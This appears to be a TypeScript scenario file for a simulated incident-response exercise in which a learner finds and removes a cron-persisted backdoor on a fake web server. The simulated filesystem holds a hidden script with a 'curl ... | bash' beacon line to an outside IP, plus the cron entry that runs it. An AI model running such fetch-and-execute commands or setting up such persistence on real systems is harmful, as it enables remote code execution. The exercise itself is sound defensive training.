import { dir, file, getNode } from '../filesystem'
import type { Scenario, ShellState } from '../types'

function buildInitialState(): ShellState {
  const root = dir({
    home: dir(
      {
        analyst: dir(
          {
            'README.txt': file(
              'Hey - a coworker said the web server has been acting slow and weird since last night.\n' +
                'Can you check it out? Start by looking at what is running, then check /var and /etc\n' +
                'for anything that should not be there.\n',
              0o644,
              'analyst',
              'analyst',
            ),
          },
          0o755,
          'analyst',
          'analyst',
        ),
      },
      0o755,
      'root',
      'root',
    ),
    var: dir({
      www: dir({ html: dir({ 'index.php': file('<?php echo "Welcome"; ?>\n') }) }),
      log: dir({
        'auth.log': file(
          [
            'Jan 10 03:14:01 web sshd[1122]: Accepted publickey for analyst from 10.0.0.4 port 51022 ssh2',
            'Jan 10 03:15:40 web sudo: analyst : COMMAND=/usr/bin/apt update',
            'Jan 10 04:02:11 web CRON[882]: (root) CMD (/etc/cron.d/sysupdate)',
          ].join('\n') + '\n',
        ),
      }),
    }),
    etc: dir({
      'cron.d': dir({
        sysupdate: file('* * * * * root /tmp/.hidden/update.sh\n', 0o644, 'root', 'root'),
      }),
    }),
    tmp: dir({
      '.hidden': dir({
        'update.sh': file(
          '#!/bin/bash\n# looks harmless, is not harmless\ncurl -s http://198.51.100.77/beacon | bash\n',
          0o755,
          'root',
          'root',
        ),
      }),
    }),
  })

  return {
    root,
    cwd: '/home/analyst',
    user: 'analyst',
    processes: [
      { pid: 1, user: 'root', cmd: '/sbin/init' },
      { pid: 412, user: 'www-data', cmd: '/usr/sbin/apache2 -k start' },
      { pid: 892, user: 'root', cmd: '/bin/bash /tmp/.hidden/update.sh' },
      { pid: 1200, user: 'analyst', cmd: '-bash' },
    ],
    services: { apache2: 'active', sshd: 'active' },
    hosts: [],
    flags: {},
    submissions: {},
    sudoRules: ['kill 892', 'rm /tmp/.hidden/update.sh', 'rm /etc/cron.d/sysupdate'],
  }
}

export const INCIDENT_SCENARIO: Scenario = {
  id: 'sim-incident',
  title: 'Incident: Cron Persistence',
  emoji: '🕵️',
  prompt: 'analyst@web:~$',
  briefing: [
    'A coworker says the web server has been acting strangely since last night.',
    'You have a shell on the box. Investigate, then clean it up properly.',
  ],
  buildInitialState,
  objectives: [
    {
      id: 'viewed-script',
      label: 'View the suspicious script before touching anything (preserve evidence)',
      check: (s) => !!s.flags['viewed:/tmp/.hidden/update.sh'],
    },
    {
      id: 'killed-process',
      label: 'Kill the malicious process',
      check: (s) => !s.processes.some((p) => p.cmd.includes('update.sh')),
    },
    {
      id: 'removed-persistence',
      label: 'Remove the malicious script and its cron persistence entry',
      check: (s) => !getNode(s.root, '/etc/cron.d/sysupdate') && !getNode(s.root, '/tmp/.hidden/update.sh'),
    },
  ],
  commands: ['ls', 'cd', 'pwd', 'cat', 'grep', 'ps', 'kill', 'rm', 'find', 'sudo'],
  hints: [
    'Start with `ps` to see what is actually running on this box.',
    'Anything running out of /tmp is worth a very close look — check `cat /tmp/.hidden/update.sh`.',
    'Cron jobs live in files under /etc/cron.d/ — try `cat /etc/cron.d/sysupdate`.',
    'The malicious process and files are owned by root — your analyst account cannot touch them directly. Check `sudo -l` to see what you\'re actually allowed to run.',
    'Once you know the PID from `ps`, use `sudo kill <pid>` to stop it, then `sudo rm` both the script and the cron file.',
  ],
}
